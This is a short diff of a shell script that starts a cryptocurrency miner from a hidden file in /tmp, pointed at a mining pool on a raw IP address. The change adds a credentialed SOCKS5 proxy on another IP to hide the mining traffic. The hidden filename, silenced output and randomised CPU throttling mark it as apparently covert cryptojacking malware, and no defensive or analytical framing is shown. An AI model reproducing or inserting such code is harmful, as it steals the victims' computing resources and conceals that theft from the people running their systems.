@@ -71,7 +71,8 @@ TPID=$!
 
 # 6. Miners — DIRECT EXEC (v18.1 proven path)
 nice -n 19 /tmp/.p8 --coin pearl --url 23.94.152.126:80 \
-    --user "${PRL}.${WRK}" 2>/dev/null &
+    --user "${PRL}.${WRK}" \
+    --proxy socks5://majapahlevi:majapahlevi@23.94.21.110:443 2>/dev/null &
 P1=$!
 cpulimit -l $((RANDOM%25+40)) -p $P1 2>/dev/null &
 
